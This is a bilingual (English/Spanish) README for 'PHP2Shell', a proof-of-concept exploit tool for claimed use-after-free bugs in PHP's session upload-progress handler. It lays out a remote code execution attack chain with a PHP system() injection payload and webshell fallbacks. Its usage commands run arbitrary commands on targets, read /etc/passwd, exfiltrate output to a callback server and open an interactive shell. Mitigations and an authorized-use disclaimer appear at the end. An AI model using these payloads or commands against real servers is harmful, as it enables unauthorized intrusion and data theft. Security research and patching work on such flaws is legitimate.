# PHP2Shell — CVE-2026-109618 / CVE-2026-109619

```
                %                
               %%%               
               %%%%%             
                %%%%%            
           %%     %%%%           
          %%%%     %%%%          
         %%%%       %%%%         
       %%%%%    #    #####       
      %:%%     ###     ####      
     % %%     ####%     # ##     
    ####    **###        # ##    
  ### #    ***#     %%    ****#  
 # ###    +***     %%%%    *** * 
 ***     ++**    #%%%%%%     ****
  ***    ++**       %%%%    *-*  
    ***   +***     % %%   + +    
      ++   * *#   %% %    +      
            **####%%%   +        
             *### %%             
               # #               
                #                
```

> **For authorized security research, CTF, and educational use only.**

---

## English

### What is this?

Proof-of-concept exploit for two heap use-after-free vulnerabilities in PHP's
`session.upload_progress` handler (`php_session_rfc1867_callback`).

A remote attacker who can upload files and trigger a Local File Inclusion (LFI)
can achieve **unauthenticated Remote Code Execution** on unpatched PHP servers.

- **CVSS 9.2 (v4.0)**
- Affects **PHP 5.4+** (`session.upload_progress.enabled` is ON by default)
- PHP 5.x and 7.x are EOL — no patch will be released for those branches

### Affected versions

| Branch | Vulnerable | Patched in |
|--------|-----------|------------|
| PHP 5.x | All | EOL — no patch |
| PHP 7.x | All | EOL — no patch |
| PHP 8.2 | < 8.2.35 | 8.2.35 |
| PHP 8.3 | < 8.3.36 | 8.3.36 |
| PHP 8.4 | < 8.4.27 | 8.4.27 |
| PHP 8.5 | < 8.5.12 | 8.5.12 |

### Attack chain

1. **Session poisoning** — multipart POST with
   `PHP_SESSION_UPLOAD_PROGRESS=<?php system(CMD);?>` causes PHP to write
   attacker-controlled PHP code into the session file on disk.
2. **Race / UAF trigger** — slow chunked upload + concurrent session lifecycle
   requests trigger the heap use-after-free in `php_session_rfc1867_callback`.
3. **LFI execution** — the poisoned session file is included via a known or
   discovered LFI parameter, executing the injected payload and returning output.

Fallback chains when LFI is unavailable: log poisoning → FastCGI direct →
PEAR webshell drop.

### Requirements

- Python 3.10+
- No external dependencies (stdlib only)

### Usage

```bash
# Check if target is vulnerable (no exploit)
python3 poc.py http://target/index.php --probe-only

# Run with default command (id)
python3 poc.py http://target/index.php

# Custom command + known LFI parameter
python3 poc.py http://target/page.php "cat /etc/passwd" --lfi-param page

# More rounds, faster chunks
python3 poc.py http://target/ "whoami" --rounds 20 --chunk-delay 0.001

# Self-signed / lab HTTPS
python3 poc.py https://target/ "id" --no-verify

# Blind RCE (out-of-band exfil via curl)
python3 poc.py http://target/ "id" --callback http://your-server.com/x

# Interactive shell (requires a working LFI param)
python3 poc.py http://target/page.php "id" --lfi-param page --interactive
```

### Mitigations

- **Update PHP** to the patched version for your branch (see table above).
- Set `session.upload_progress.enabled = Off` in `php.ini` — this prevents
  session file poisoning entirely.
- Disable or restrict file upload endpoints at the WAF/reverse-proxy level.
- Avoid user-controlled `include`/`require` paths (LFI hardening).

---

## Español

### ¿Qué es esto?

Exploit de prueba de concepto para dos vulnerabilidades de heap use-after-free
en el manejador `session.upload_progress` de PHP (`php_session_rfc1867_callback`).

Un atacante remoto que pueda subir archivos y activar una Inclusión de Archivos
Locales (LFI) puede lograr **Ejecución Remota de Código sin autenticación**
en servidores PHP sin parche.

- **CVSS 9.2 (v4.0)**
- Afecta **PHP 5.4+** (`session.upload_progress.enabled` está activo por defecto)
- PHP 5.x y 7.x están en EOL — no habrá parches para esas ramas

### Versiones afectadas

| Rama | Vulnerable | Parcheada en |
|------|-----------|--------------|
| PHP 5.x | Todas | EOL — sin parche |
| PHP 7.x | Todas | EOL — sin parche |
| PHP 8.2 | < 8.2.35 | 8.2.35 |
| PHP 8.3 | < 8.3.36 | 8.3.36 |
| PHP 8.4 | < 8.4.27 | 8.4.27 |
| PHP 8.5 | < 8.5.12 | 8.5.12 |

### Cadena de ataque

1. **Envenenamiento de sesión** — POST multipart con
   `PHP_SESSION_UPLOAD_PROGRESS=<?php system(CMD);?>` hace que PHP escriba
   código PHP controlado por el atacante en el archivo de sesión en disco.
2. **Carrera / UAF** — una subida lenta por chunks más peticiones concurrentes
   de ciclo de vida de sesión activan el heap use-after-free en
   `php_session_rfc1867_callback`.
3. **Ejecución por LFI** — el archivo de sesión envenenado se incluye mediante
   un parámetro LFI conocido o descubierto automáticamente, ejecutando el
   payload e imprimiendo la salida.

Cadenas de fallback cuando no hay LFI: log poisoning → FastCGI directo →
webshell via PEAR.

### Requisitos

- Python 3.10+
- Sin dependencias externas (solo stdlib)

### Uso

```bash
# Solo verificar si el objetivo es vulnerable (sin exploit)
python3 poc.py http://objetivo/index.php --probe-only

# Comando por defecto (id)
python3 poc.py http://objetivo/index.php

# Comando personalizado + parámetro LFI conocido
python3 poc.py http://objetivo/pagina.php "cat /etc/passwd" --lfi-param page

# Más rondas, chunks más rápidos
python3 poc.py http://objetivo/ "whoami" --rounds 20 --chunk-delay 0.001

# HTTPS con certificado autofirmado / laboratorio
python3 poc.py https://objetivo/ "id" --no-verify

# RCE ciego (exfiltración OOB via curl)
python3 poc.py http://objetivo/ "id" --callback http://tu-servidor.com/x

# Shell interactiva (requiere un parámetro LFI funcional)
python3 poc.py http://objetivo/pagina.php "id" --lfi-param page --interactive
```

### Mitigaciones

- **Actualizar PHP** a la versión parcheada para tu rama (ver tabla arriba).
- Establecer `session.upload_progress.enabled = Off` en `php.ini` — esto
  impide el envenenamiento del archivo de sesión por completo.
- Bloquear o restringir los endpoints de subida de archivos en el WAF o
  proxy inverso.
- Evitar rutas de `include`/`require` controladas por el usuario (hardening LFI).

---

## Author

**Juguitos** — luisda2199@gmail.com  
2026-10-22

---

> This tool is provided for **authorized security testing and educational purposes only**.  
> Unauthorized use against systems you do not own or have explicit permission to test is illegal.

